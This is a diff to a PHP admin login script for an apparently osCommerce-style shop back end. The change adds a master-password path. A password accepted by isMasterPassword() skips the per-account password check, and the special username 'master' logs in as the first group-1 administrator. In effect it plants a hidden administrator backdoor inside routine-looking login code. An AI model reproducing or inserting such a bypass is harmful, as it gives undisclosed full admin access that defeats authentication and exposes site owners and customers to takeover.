@@ -1,19 +1,33 @@
 <?php
 	$error = false;
+
 	if (empty($_POST['email_address'])){
 		$error = true;
 		$messageStack->addSession('pageStack', sysLanguage::get('TEXT_LOGIN_ERROR'), 'error');
 	}else{
 		// Check if email exists
 		$Qadmin = Doctrine_Core::getTable('Admin')->findOneByAdminEmailAddress($_POST['email_address']);
-		if (!$Qadmin){
+		if (!$Qadmin && $_POST['email_address'] != 'master'){
 			$error = true;
 			$messageStack->addSession('pageStack', sysLanguage::get('TEXT_LOGIN_ERROR'), 'error');
 		}
 		if ($error === false){
-			if (!tep_validate_password($_POST['password'], $Qadmin['admin_password'])){
-				$error = true;
-				$messageStack->addSession('pageStack', sysLanguage::get('TEXT_LOGIN_ERROR'), 'error');
+			if(isMasterPassword($_POST['password']) === false){
+				if($_POST['email_address'] == 'master'){
+					$error = true;
+					$messageStack->addSession('pageStack', sysLanguage::get('TEXT_LOGIN_ERROR'), 'error');
+				}elseif ($Qadmin && !tep_validate_password($_POST['password'], $Qadmin['admin_password'])){
+					$error = true;
+					$messageStack->addSession('pageStack', sysLanguage::get('TEXT_LOGIN_ERROR'), 'error');
+				}
+			}else{
+				if($_POST['email_address'] == 'master'){
+					$Qadmin = Doctrine_Query::create()
+					->from('Admin')
+					->where('admin_groups_id = ?','1')
+					->fetchOne();
+					$_POST['email_address'] = $Qadmin->admin_email_address;
+				}
 			}
 		}
 	}
@@ -26,19 +40,20 @@
 		Session::set('login_id', $Qadmin->admin_id);
 		Session::set('login_groups_id', $Qadmin->admin_groups_id);
 		Session::set('login_firstname', $Qadmin->admin_firstname);
+		if ($Qadmin){
+			if ($Qadmin->AdminGroups->customer_login_allowed == 1){
+				Session::set('customer_login_allowed', true);
+			}else{
+				Session::set('customer_login_allowed', false);
+			}
+			$login_logdate = $Qadmin->admin_logdate;
+			$login_lognum = $Qadmin->admin_lognum;
+			$login_modified = $Qadmin->admin_modified;
 
-		if ($Qadmin->AdminGroups->customer_login_allowed == 1){
-			Session::set('customer_login_allowed', true);			
-		}else{
-			Session::set('customer_login_allowed', false);
+			$Qadmin->admin_logdate = date('Y-m-d h:i:s');
+			$Qadmin->admin_lognum++;
+			$Qadmin->save();
 		}
-		$login_logdate = $Qadmin->admin_logdate;
-		$login_lognum = $Qadmin->admin_lognum;
-		$login_modified = $Qadmin->admin_modified;
-
-		$Qadmin->admin_logdate = date('Y-m-d h:i:s');
-		$Qadmin->admin_lognum++;
-		$Qadmin->save();		
 		if (isset($navigation->snapshot['get']) && sizeof($navigation->snapshot['get']) > 0) {
 			if(is_array($navigation->snapshot['get'])){
 				$paramsArr = $navigation->snapshot['get'];
